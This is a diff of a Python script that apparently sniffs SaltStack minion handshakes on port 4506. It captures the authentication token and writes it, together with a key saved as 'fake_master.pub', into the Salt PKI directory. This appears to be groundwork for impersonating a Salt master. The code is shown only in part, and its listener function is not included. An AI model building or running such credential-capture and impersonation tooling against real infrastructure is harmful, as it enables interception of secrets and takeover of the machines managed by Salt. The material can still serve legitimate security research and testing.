@@ -1,7 +1,7 @@
 import argparse
 import socket
-import json
 import sys
+import os
 
 import zmq
 import pcap
@@ -12,14 +12,13 @@ parser = argparse.ArgumentParser(description='Listens for salt-minion handshakes
 parser.add_argument('--interface', '-i', required=True, help='The interface to listen on')
 parser.add_argument('--address', '-a', required=True, help='The IP address to listen for packets from')
 parser.add_argument('--port', '-p', type=int, default=4506, help='The port to listen for packets on')
-parser.add_argument('--output', '-o', default='token', help='Where to output the captured token to')
+parser.add_argument('--output', '-o', default='/etc/salt/pki', help='Path to the salt PKI directory')
 
 log = lambda x: sys.stderr.write(x + "\n"); sys.stderr.flush()
 
 
 def main(args):
     listener = listen_to_salt_packets(args.interface, args.address, args.port)
-    results = {}
 
     log("Listening for salt packets going to {address} on port {port}".format(**vars(args)))
     for time, packet, data in listener:
@@ -32,10 +31,17 @@ def main(args):
             continue
 
         log("Found a token!")
-        log("Writing token to '%s'" % args.output)
 
-        with open(args.output, 'w') as fp:
+        token_path = os.path.join(args.output, 'token')
+        pubkey_path = os.path.join(args.output, 'fake_master.pub')
+
+        log("Writing token to '%s'" % token_path)
+        with open(token_path, 'w') as fp:
             fp.write(data['token'])
+
+        log("Writing master pub key to '%s'" % pubkey_path)
+        with open(pubkey_path, 'w') as fp:
+            fp.write(data['pub_key'])
 
         break
 
